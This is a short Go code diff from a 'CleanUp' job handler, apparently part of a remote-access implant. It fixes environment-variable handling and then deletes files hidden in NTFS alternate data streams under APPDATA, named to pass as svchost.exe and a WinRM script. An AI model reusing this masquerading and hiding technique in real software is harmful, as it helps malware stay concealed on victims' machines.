@@ -26,10 +26,7 @@ func (c CleanUp) Run(clientID string, jobID string, args []string) (string, erro
 		return "", errors.New("cleanup takes 1 argument")
 	}
 	mode := args[0]
-	appdata, err := os.LookupEnv("APPDATA")
-	if err != nil {
-		return "", err
-	}
+	appdata, _ := os.LookupEnv("APPDATA")
 	path := appdata + "\\Windows:svchost.exe"
 	os.Remove(path)
 	path = appdata + "\\Windows:winrm.vbs"
